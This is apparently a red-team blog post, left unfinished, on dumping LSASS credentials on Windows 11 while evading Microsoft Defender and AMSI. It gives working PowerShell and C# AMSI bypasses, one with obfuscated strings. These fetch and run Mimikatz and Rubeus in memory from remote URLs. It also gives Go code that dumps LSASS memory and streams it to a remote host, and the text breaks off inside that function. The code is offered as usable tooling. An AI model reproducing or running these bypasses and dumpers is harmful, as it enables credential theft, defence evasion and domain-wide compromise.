---
title: "Dumping LSASS on Windows 11 - InProgress"
layout: "post"
categories: "Windows"
tags: ["Red Team"]
---

Hey everyone, today I'm diving into one of the more distinctive techniques used by pentesters and adversaries alike: LSASS dumping for Windows. Personally, I view it as a significant OPSEC hazard and would strongly advise against it. However, there are situations where it could prove useful, such as when you've compromised a Windows machine with access to domain admin or a service account capable of logging into other Windows machines or the Domain Controller. In such cases, dumping LSASS to obtain NTLM hashes enables attempts at pivoting through hash cracking or conducting a pass-the-hash attack.

Microsoft has taken LSASS seriously, recognizing its criticality. While they haven't always prioritized user-induced post-exploitation compromises in other instances, they've been compelled to address this technique due to its impact on their customers. Active Directory remains one of the most widely used yet poorly understood and configured identity management frameworks. If an attacker successfully dumps LSASS on the primary Domain Controller for an AD instance, they could potentially compromise thousands of accounts, including long-forgotten service and user accounts that remain active but haven't been used in years.

Another issue to consider is that NTLM hashes are relatively easy to crack due to their reliance on MD4 for the hashing function and DES for the encryption schema. Microsoft introduced NTLMv2 as an improvement, which utilizes HMAC-MD5 (Hash-based Message Authentication Code with MD5). However, even with this enhancement, NTLMv2 remains susceptible to cracking, especially with the computational power of modern GPUs and comprehensive wordlists or hashcat rules.

As mentioned in this blog, [https://www.tarlogic.com/cybersecurity-glossary/ntlm-hash/](https://www.tarlogic.com/cybersecurity-glossary/ntlm-hash/), leveraging Kerberos-based authentication is indeed the most secure approach. However, it's important to note that even when Kerberos is the primary authentication method, NTLM hashes may still be stored in LSASS, posing a security risk.

Taking all of this into consideration, Microsoft has taken extensive measures to prevent and flag LSASS dumping. They've even published a blog comparing various techniques and demonstrating how Microsoft Defender for Endpoint performs against different LSASS dumping methods [https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/](https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/).

It's important to note that in order to dump LSASS, one must already be an Admin user with an elevated process through a UAC bypass or currently possess the permission level of NT AUTHORITY\SYSTEM. Additionally, enabling the SeDebugPrivilege privilege is required to perform the dump. Microsoft has implemented numerous checks to prevent or flag this technique, as showcased in the aforementioned blog.

For this particular blog, I will only delve into Microsoft Defender and AMSI bypass techniques, with plans to cover EDR in a future post.

To kick things off, let's discuss using PowerShell to dump LSASS. An insightful blog from Blaze Information Security underscores that many AV/EDR products support AMSI [https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/](https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/). AMSI, while a security measure in itself, is remarkably easy to bypass, which makes it a prime target for attackers.

One reason attackers favor targeting AMSI is its susceptibility to bypass, and another is PowerShell's versatility in loading and executing code directly into memory without any disk interaction. Common techniques observed include using iex (Invoke-Expression) to execute a PowerShell script remotely from the web or [System.Reflection.Assembly]::Load() to load a .NET assembly directly from the web, both of which avoid touching the disk altogether.

Attackers have also been known to utilize Mimikatz to dump LSASS. However, the regular Mimikatz binary, written in C, is likely one of the most signatured pieces of code, along with Meterpreter.

Many years ago, Joe Bialek developed a PowerShell script that could invoke Mimikatz into memory. While this script is flagged by Defender even if AMSI is bypassed, there have been numerous modified versions that change function names, yet the technique still proves effective against the latest Windows 11 Defender. I will demonstrate this by utilizing the AmsiScanBuffer patch from this blog [https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6).

In the author's implementation, they obfuscated the lookup for GetProcAddress and also modified the assembly to evade basic detection. I decided to take the obfuscation, forcing AmsiScanBuffer to return an E_INVALIDARG error, one step further from the blog. The custom assembly implementation is shown below.


```bash 
xor eax, eax ; Clear the EAX register by XORing it with itself
shl eax, 16 ; Shift the contents of EAX left by 16 bits, effectively clearing the lower 16 bits
or ax, 0x57 ; Set the lower 16 bits of EAX using a bitwise OR operation with the value 0x57
ret ; Return from the current subroutine
```

I've modified the script to include my custom version of the AmsiScanBuffer patch and added a modified version of invoke-mimikatz to streamline it into a one-shot script.

```powershell 
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
     Equals('System.dll')
     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}


function getDelegateType {
    Param (
     [Parameter(Position = 0, Mandatory = $True)] [Type[]]
     $func, [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,
    AutoClass', [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
[System.Reflection.CallingConventions]::Standard, $func).
     SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
$func). SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}


$a="A"
$b="msiS"
$c="canB"
$d="uffer"
[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
$buf = [Byte[]] (0x31, 0xC0, 0xC1, 0xE0, 0x10, 0x66, 0x83, 0xC8, 0x57, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)
wget('https://gist.githubusercontent.com/pich4ya/144d32262861b573279d15e653c4e08d/raw/6f019c4e2f1f62ffc0754d01dff745d3cec62057/Invoke-SoHighSoHigh.ps1') -UseBasicParsing|iex
Invoke-SoHighSoHigh -Command '"coffee"'
```

![](/assets/posts/2024-05-19-LSASS-Dumping-Windows11/amsi_patch_ps.bmp)


In the image above, we can observe that we're able to load and execute Mimikatz without triggering Defender. However, as OutFlank pointed out in their blog [https://www.outflank.nl/blog/2019/10/20/red-team-tactics-active-directory-recon-using-adsi-and-reflective-dlls/](https://www.outflank.nl/blog/2019/10/20/red-team-tactics-active-directory-recon-using-adsi-and-reflective-dlls/) this technique isn't suitable for mature environments. Cornelis was certainly ahead of the curve when this blog first emerged in 2019.

Larger organizations often deploy a SIEM such as Splunk and enable script block logging. Script block logging captures a wide array of activities, including the execution of cmdlets, functions, expressions, pipeline operations, variable assignments, control flow statements, error handling, interactive sessions, external scripts, remote PowerShell sessions, scheduled tasks, event handlers, and module loading. These activities are logged if they are enclosed within curly braces {}. This effectively renders the AMSI bypass script and the invoke-mimikatz script ineffective.

It's important to note that if an organization has Splunk and the capability to perform automated monitoring of PowerShell code within script blocks, they likely have an EDR solution enabled as well.



There is indeed a workaround for script block logging, which involves utilizing Add-Type and embedding C# code blocks. To demonstrate this technique, I'll be using an In-Process Patchless AMSI Bypass. This process entails setting a hardware breakpoint on the AmsiScanBuffer function, employing a vectored exception handler to alter AMSI scan results, and modifying the CPU's debug registers to control the execution flow.

I've converted this implementation from [https://gist.githubusercontent.com/susMdT/360c64c842583f8732cc1c98a60bfd9e/raw/fd9a00317decf8afd647e0f770fec5ba6e2f89f5/Program.cs](https://gist.githubusercontent.com/susMdT/360c64c842583f8732cc1c98a60bfd9e/raw/fd9a00317decf8afd647e0f770fec5ba6e2f89f5/Program.cs) into a PowerShell script, along with adding a few obfuscation techniques. Here's the code:


```powershell
$cs = @'
using System;
using System.Net;
using System.Reflection;
using System.Text;
using System.Runtime.InteropServices;

namespace Test
{
    public class Program
    {
        static IntPtr baser = WinAPI.LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
        static IntPtr addr = WinAPI.GetProcAddress(baser, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
        // Allocate memory for the CONTEXT64 structure
        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf<WinAPI.CONTEXT64>());

        public static void Main()
        {
            SetupBypass();

            // Configure security protocol and load external assembly
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            var sb = Assembly.Load(new WebClient().DownloadData("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"));
            sb.EntryPoint.Invoke(null, new object[] { new string[] { "" } });
            Console.WriteLine("Assembly FullName: " + sb.FullName);
        }

        // Setup the Vectored Exception Handler for bypass
        static void SetupBypass()
        {
            // Create and initialize CONTEXT64 structure
            WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64 { ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL };

            // Get the method information for the Handler method
            MethodInfo method = typeof(Program).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            Marshal.StructureToPtr(ctx, pCtx, true);
            WinAPI.GetThreadContext((IntPtr)(-2), pCtx);

            // Update the CONTEXT64 structure with the current values
            ctx = Marshal.PtrToStructure<WinAPI.CONTEXT64>(pCtx);

            // Enable the breakpoint for function
            EnableBreakpoint(ctx, addr, 0);

            WinAPI.SetThreadContext((IntPtr)(-2), pCtx);
        }

        // Custom exception handler for the Vectored Exception Handler
        public static long Handler(IntPtr exceptions)
        {
            // Marshal the EXCEPTION_POINTERS structure from the exception pointer
            WinAPI.EXCEPTION_POINTERS ep = Marshal.PtrToStructure<WinAPI.EXCEPTION_POINTERS>(exceptions);
            WinAPI.EXCEPTION_RECORD exceptionRecord = Marshal.PtrToStructure<WinAPI.EXCEPTION_RECORD>(ep.pExceptionRecord);
            WinAPI.CONTEXT64 contextRecord = Marshal.PtrToStructure<WinAPI.CONTEXT64>(ep.pContextRecord);

            // Check if the exception is a single step exception and the address is the correct function
            if (exceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && exceptionRecord.ExceptionAddress == addr)
            {
                // Capture the return address and scan result pointer
                ulong returnAddress = (ulong)Marshal.ReadInt64((IntPtr)contextRecord.Rsp);
                IntPtr scanResult = Marshal.ReadIntPtr((IntPtr)(contextRecord.Rsp + (6 * 8))); // 5th arg, swap it to clean

                Console.WriteLine("Buffer: 0x" + contextRecord.R8.ToString("X"));
                Console.WriteLine("Scan Result: 0x" + Marshal.ReadInt32(scanResult).ToString("X"));

                // Modify the scan result to AMSI_RESULT_CLEAN
                Marshal.WriteInt32(scanResult, 0, WinAPI.AMSI_RESULT_CLEAN);

                contextRecord.Rip = returnAddress;
                contextRecord.Rsp += 8;
                contextRecord.Rax = 0; // S_OK

                contextRecord.Dr0 = 0;
                contextRecord.Dr7 = SetBits(contextRecord.Dr7, 0, 1, 0);
                contextRecord.Dr6 = 0;
                contextRecord.EFlags = 0;

                // Set the updated context record back to the exception pointers
                Marshal.StructureToPtr(contextRecord, ep.pContextRecord, true);

                // Continue execution after handling the exception
                return WinAPI.EXCEPTION_CONTINUE_EXECUTION;
            }
            else
            {
                // Continue searching for other exception handlers
                return WinAPI.EXCEPTION_CONTINUE_SEARCH;
            }
        }

        // Enable the breakpoint at the specified address in the context structure
        public static void EnableBreakpoint(WinAPI.CONTEXT64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0:
                    ctx.Dr0 = (ulong)address.ToInt64();
                    break;
                case 1:
                    ctx.Dr1 = (ulong)address.ToInt64();
                    break;
                case 2:
                    ctx.Dr2 = (ulong)address.ToInt64();
                    break;
                case 3:
                    ctx.Dr3 = (ulong)address.ToInt64();
                    break;
            }

            //Clearing bits 16-31 in Dr7 to disable existing hardware breakpoints,
            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            //Setting the specific hardware breakpoint for the given index
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            //Clearing Dr6 to handle hardware breakpoint conditions
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pCtx, true);
        }

        // Set specified bits in a ulong value
        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }

    // WinAPI class containing necessary structures and function signatures
    public class WinAPI
    {
        public const Int32 AMSI_RESULT_CLEAN = 0;
        public const Int32 EXCEPTION_CONTINUE_SEARCH = 0;
        public const Int32 EXCEPTION_CONTINUE_EXECUTION = -1;
        public const UInt32 EXCEPTION_SINGLE_STEP = 0x80000004;

        [DllImport("ke" +"rne" + "l32", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("ke" +"rne" + "l32", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("ke" +"rne" + "l32", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("ke" +"rne" + "l32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("ke" +"rne" + "l32")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CONTEXT64_FLAGS : uint
        {
            // Specifies that this context is for the AMD64 architecture
            CONTEXT64_AMD64 = 0x100000,

            // Control registers (cs, ss, ds, es, fs, gs, and eflags) are valid
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,

            // Integer registers (rax, rcx, rdx, rbx, rsp, rbp, rsi, rdi, r8-r15) are valid
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,

            // Segment registers (cs, ds, es, fs, gs, ss) are valid
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,

            // Floating-point state (XMM registers and MXCSR) is valid
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,

            // Debug registers (dr0-dr7) are valid
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,

            // Full context, including control, integer, floating-point, and debug registers, is valid
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,

            // All context, including control, integer, segment, floating-point, and debug registers, is valid
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            // High-order 64 bits of the 128-bit value
            public ulong High;

            // Low-order 64 bits of the 128-bit value
            public long Low;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            // Floating-point control word
            public ushort ControlWord;

            // Floating-point status word
            public ushort StatusWord;

            // Floating-point tag word
            public byte TagWord;

            // Reserved for future use
            public byte Reserved1;

            // Floating-point instruction error code
            public ushort ErrorOpcode;

            // Offset into Extended Registers area where the error occurred
            public uint ErrorOffset;

            // Selector of the segment containing the instruction that caused the error
            public ushort ErrorSelector;

            // Reserved for future use
            public ushort Reserved2;

            // Offset into the Extended Registers area for saving processor state
            public uint DataOffset;

            // Selector of the segment containing the data that caused the exception
            public ushort DataSelector;

            // Reserved for future use
            public ushort Reserved3;

            // Mask for the x87 FPU status word
            public uint MxCsr;

            // Mask for the valid bits in MxCsr
            public uint MxCsr_Mask;

            // Floating-point registers (xmm0-xmm7)
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            // XMM registers (xmm8-xmm15)
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            // Reserved for future use
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            // Home address for the 6 integer registers P1-P6
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            // Flags specifying the valid context
            public CONTEXT64_FLAGS ContextFlags;

            // Machine status register for floating-point state
            public uint MxCsr;

            // Segment selectors and flags
            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;

            // Processor flags
            public uint EFlags;

            // Debug registers
            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            // Integer registers
            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;
            
            // Union of XSAVE_FORMAT64 and legacy floating-point state
            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            // Vector registers (ymm0-ymm15)
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            
            // Vector control and status
            public ulong VectorControl;

            // Debug control values
            public ulong DebugControl;

            // Addresses for the last branch and exception events
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_RECORD
        {
            // Exception code describing the exception that occurred
            public uint ExceptionCode;

            // Exception flags providing additional information
            public uint ExceptionFlags;

            // Pointer to an associated EXCEPTION_RECORD structure
            public IntPtr ExceptionRecord;

            // Address at which the exception occurred
            public IntPtr ExceptionAddress;

            // Number of parameters associated with the exception
            public uint NumberParameters;

            // Array of additional information about the exception
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)]
            public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct EXCEPTION_POINTERS
        {
            // Pointer to an EXCEPTION_RECORD structure
            public IntPtr pExceptionRecord;

            // Pointer to a CONTEXT64 structure
            public IntPtr pContextRecord;
        }

    }
}
'@

Add-Type -TypeDefinition $cs -Language CSharp
[Test.Program]::Main()
```

![](/assets/posts/2024-05-19-LSASS-Dumping-Windows11/hardware_breakpoint_rubeus.bmp)


When invoking the script from the web server, we observe that it runs Rubeus without triggering any flags. However, to utilize this script effectively, we need to create a .NET assembly capable of performing an LSASS dump. Even with patching AMSI, bypassing Defender remains necessary. Later in the blog, I'll demonstrate how to create a .NET assembly that can be paired with this script.

Moving forward, let's explore another technique: utilizing a vulnerable kernel driver to dump LSASS. This approach has seen a resurgence in usage by many nation-state actors recently. The primary reason for this resurgence is Kernel Patch Protection (KPP).

An early post explaining how EDR solutions perform userland hooking can be found here: [https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6](https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6). The blog also delves into Microsoft's implementation of KPP (PatchGuard) to prevent hooking of kernel functions. As the blog describes, `KPP scans the kernel on almost every level and will trigger a BSOD if a modification is detected. This includes ntoskrnl portion which houses the WINAPI’s kernel level’s logic." This knowledge ensures that the EDR would not and did not hook any kernel-level function inside that portion of the call stack, leaving adversaries with only the user-land's RPM and NtReadVirtualMemory calls.`

A BSOD (Blue Screen of Death) is similar to a kernel panic in the Linux kernel. Though by default Microsoft will perform an automated reboot when a BSOD is triggered. Most Linux distributions do not automatically reboot after a kernel panic. The system remains halted to allow the user to see the panic message and diagnose the issue. You can configure Linux to reboot after a specific time period if a kernel panic occurs too. 

As EDR kernel drivers are restricted from hooking kernel-level functions, they required an alternative method to interact with the kernel for data retrieval. This blog provides a comprehensive overview of how EDR interacts with the Windows kernel: [https://web.archive.org/web/20231121022947/http://blog.deniable.org/posts/windows-callbacks/](https://web.archive.org/web/20231121022947/http://blog.deniable.org/posts/windows-callbacks/).

EDR solutions can receive telemetry data via Windows kernel Ps callbacks. Windows permits kernel drivers to register callback routines, which are subsequently invoked when specific events occur, such as process/thread execution and termination, image loads, and registry operations. Enforcing kernel drivers to comply with an API and prohibiting modification of kernel memory is a sound practice. However, if an attacker can load their own kernel module into memory, they can spoof or conceal the data returned from the callbacks, effectively impairing the effectiveness of EDR solutions.

To mitigate this risk, Microsoft implemented Driver Signature Enforcement to prevent unauthorized kernel modules from loading and thwart the deployment of rootkits.


Attackers have circumvented this enforcement by exploiting vulnerabilities in drivers, allowing them to write into kernel space. Numerous drivers have been found to have exploits, and while Microsoft has attempted to revoke signatures, many vulnerable drivers remain in the wild.

An automated solution developed to weaponize vulnerable signed drivers is EDRSandBlast [https://github.com/wavestone-cdt/EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast). However, Microsoft has since issued a signature for this tool, so in its default form, it will be flagged [https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:Win64/EDRSandblast!MSR&threatId=-2147073759](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:Win64/EDRSandblast!MSR&threatId=-2147073759). 


Attackers began using the BYOVD (Bring Your Own Vulnerable Driver) technique to dump LSASS. An example of this implementation is detailed in [https://tastypepperoni.medium.com/bypassing-defenders-lsass-dump-detection-and-ppl-protection-in-go-7dd85d9a32e6](https://tastypepperoni.medium.com/bypassing-defenders-lsass-dump-detection-and-ppl-protection-in-go-7dd85d9a32e6). The blog explains how the PROCEXP152.sys driver could be abused to obtain a PROCESS_ALL_ACCESS handle to a process protected by PPL. The author wrote the final solution in Go, compiling the kernel driver into the Golang binary that will load it. This technique allowed for the whole implementation to be in one binary, greatly improving the adversaries' ability to utilize it in their code execution techniques. The author also implemented functionality to transfer the dump over the network to a remote machine, including using SMB. This solution was a great turnkey option, but Microsoft quickly responded by flagging the binary and revoking the signature for the driver.




Microsoft has demonstrated a willingness to revoke signatures for drivers, particularly if they are employed in public projects aimed at dumping LSASS. Consequently, if an attacker seeks the power of a Kernel driver but cannot load one, they may resort to a chain of userland exploits against PPL (Protected Process Light) to execute LSASS memory dumping.

Gabriel Landau's BlackHat talk [https://i.blackhat.com/Asia-23/AS-23-Landau-PPLdump-Is-Dead-Long-Live-PPLdump.pdf](https://i.blackhat.com/Asia-23/AS-23-Landau-PPLdump-Is-Dead-Long-Live-PPLdump.pdf) sheds light on a history of userland bugs against PPL that Microsoft only patched after turn-key solutions emerged on GitHub. This includes Landau's own tool, PPLFault, which exploits a TOCTOU (Time-Of-Check Time-Of-Use) bug in Windows Code Integrity to achieve arbitrary code execution as WinTcp-Light, enabling memory dump.

Landau took this tool a step further with GodFault [https://www.elastic.co/security-labs/forget-vulnerable-drivers-admin-is-all-you-need](https://www.elastic.co/security-labs/forget-vulnerable-drivers-admin-is-all-you-need)., integrating the userland TOCTOU exploit with an unpatched Windows exploit in win32k!NtUserHardErrorControlCall. This allowed Landau to decrement KTHREAD.PreviousMode from UserMode (1) to KernelMode (0) on the migrated CSRSS handle, creating an exploit chain of admin -> PPL -> kernel. This work was also integrated into EDRSandblast, eliminating the need for a vulnerable driver, thereby making it easier for attackers to blind EDR once again.

Microsoft eventually patched the TOCTOU bug after 510 days. In summary, attackers will exploit unpatched vulnerabilities to perform LSASS dumping and attempt to chain exploit primitives to gain write access in the kernel.



Now that we've discussed utilizing Mimikatz, vulnerable kernel drivers, and userland exploits for LSASS dumping, let's delve into one of the latest techniques: using MiniDumpWriteDump. Recently, I came across a YouTube video demonstrating this technique, which was flagged by both Defender and Crowdstrike Falcon [https://www.youtube.com/watch?v=3nxjPkxGDWo&t=12s](https://www.youtube.com/watch?v=3nxjPkxGDWo&t=12s). Interestingly, neither Defender nor Falcon actually detects the act of performing the LSASS dump; instead, they detect the writing of LSASS output to disk, which triggers an alert after a few seconds. This detection isn't contingent on the file extension or content obfuscation.

This observation led me to theorize that tools like PPLBlade worked because they offered an option to XOR encrypt the dump before saving it to disk or transferring it remotely. To test this theory, I decided to create a Go binary capable of remotely dumping LSASS. While this code is merely a proof of concept and not in a productized form, it demonstrates that bypassing Windows Defender doesn't necessarily require advanced EDR bypass techniques.

For my test implementation, I used the code from this GitHub repository as a baseline:[https://github.com/calebsargent/GoProcDump/tree/main](https://github.com/calebsargent/GoProcDump/tree/main). In my implementation, I utilized a similar approach as the final code in the Medium blog mentioned earlier to obtain the process ID for LSASS, leveraging CreateToolhelp32Snapshot. Additionally, I created an anonymous pipe to transmit the dump content to a remote machine, ensuring it never touches disk. Below is the provided code:


```golang 
package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"syscall"
	"unsafe"
	"io"
)

const (
	TH32CS_SNAPPROCESS = 0x00000002 // Snapshot of all processes
	PROCESS_ALL_ACCESS = 0x1F0FFF
)

var (
	kernel32              = syscall.NewLazyDLL("kernel32.dll")
	procCreateToolhelp32W = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First    = kernel32.NewProc("Process32FirstW")
	procProcess32Next     = kernel32.NewProc("Process32NextW")
)

type PROCESSENTRY32 struct {
	Size                uint32   // Size of the structure in bytes
	CntUsage            uint32   // Number of references to the process
	th32ProcessID       uint32   // Process identifier
	th32DefaultHeapID   uintptr  // Default heap identifier
	th32ModuleID        uint32   // Module identifier
	CntThreads          uint32   // Number of execution threads started by the process
	th32ParentProcessID uint32   // Identifier of the process that created this process
	PcPriClassBase      int32    // Base priority of any threads created by this process
	dwFlags             uint32   // Flags
	szExeFile           [260]uint16 // Path to the executable file
}

// Enable the SeDebugPrivilege for the current process
func elevateProcessToken() error {
	type Luid struct {
		lowPart  uint32 // DWORD
		highPart int32  // long
	}
	type LuidAndAttributes struct {
		luid       Luid   // LUID
		attributes uint32 // DWORD
	}

	type TokenPrivileges struct {
		privilegeCount uint32 // DWORD
		privileges     [1]LuidAndAttributes
	}

	const SeDebugPrivilege = "SeDebugPrivilege"
	const tokenAdjustPrivileges = 0x0020
	const tokenQuery = 0x0008
	var hToken uintptr

	user32 := syscall.MustLoadDLL("user32")
	defer user32.Release()

	kernel32 := syscall.MustLoadDLL("kernel32")
	defer user32.Release()

	advapi32 := syscall.MustLoadDLL("advapi32")
	defer advapi32.Release()

	GetCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")
	GetLastError := kernel32.MustFindProc("GetLastError")
	OpenProdcessToken := advapi32.MustFindProc("OpenProcessToken")
	LookupPrivilegeValue := advapi32.MustFindProc("LookupPrivilegeValueW")
	AdjustTokenPrivileges := advapi32.MustFindProc("AdjustTokenPrivileges")

	// Get current process handle
	currentProcess, _, _ := GetCurrentProcess.Call()

	// Open process token
	result, _, err := OpenProdcessToken.Call(currentProcess, tokenAdjustPrivileges|tokenQuery, uintptr(unsafe.Pointer(&hToken)))
	if result != 1 {
		fmt.Println("OpenProcessToken(): ", result, " err: ", err)
		return err
	}

	var tkp TokenPrivileges

	// Lookup the LUID for SeDebugPrivilege
	result, _, err = LookupPrivilegeValue.Call(uintptr(0), uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(SeDebugPrivilege))), uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))))
	if result != 1 {
		fmt.Println("LookupPrivilegeValue(): ", result, " err: ", err)
		return err
	}

	const SePrivilegeEnabled uint32 = 0x00000002

	tkp.privilegeCount = 1
	tkp.privileges[0].attributes = SePrivilegeEnabled

	// Adjust token privileges
	result, _, err = AdjustTokenPrivileges.Call(hToken, 0, uintptr(unsafe.Pointer(&tkp)), 0, uintptr(0), 0)
	if result != 1 {
		fmt.Println("AdjustTokenPrivileges() ", result, " err: ", err)
		return err
	}

	// Check for errors
	result, _, _ = GetLastError.Call()
	if result != 0 {
		fmt.Println("GetLastError() ", result)
		return err
	}

	return nil
}

// Create a process dump for the specified PID
func pd(pid int) {
	var dbghelp = syscall.NewLazyDLL("Dbghelp.dll")
	var procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
	var kernel32 = syscall.NewLazyDLL("kernel32.dll")
	var procOpenProcess = kernel32.NewProc("OpenProcess")

	process, err := os.FindProcess(pid)

	if err == nil {
		fmt.Printf("Process %d found \n", process.Pid)
	} else {
		fmt.Printf("Process %d not found \n", pid)
		os.Exit(1)
	}

	// Open process with all access
	processHandle, _, err := procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), uintptr(1), uintptr(pid))

	if processHandle != 0 {
		fmt.Println("Process Handle OK")
	} else {
		fmt.Println("Process Handle Error")
		fmt.Println(err)
		os.Exit(1)
	}

	// Create an anonymous pipe
	r, w, err := os.Pipe()
	if err != nil {
		fmt.Println("Failed to create pipe:", err)
		os.Exit(1)
	}
	defer r.Close()
	defer w.Close()

	// Write the dump to the pipe
	go func() {
		defer w.Close()
		fmt.Println("Starting MiniDumpWriteDump")
		ret, _, err := procMiniDumpWriteDump.Call(uintptr(processHandle), uintptr(pid), w.Fd(), 0x00061907, 0, 0, 0)
		if ret == 0 {
			fmt.Println("Process memory dump not successful")
			fmt.Println(err)
			os.Exit(1)
		}
		fmt.Println("MiniDumpWriteDump completed successfully")
	}()

	sendDumpToRemote(r)
}

// Send the process dump data to a remote address
func sendDumpToRemote(r *os.File) {
	remoteAddr := "<IP>:<Port>"

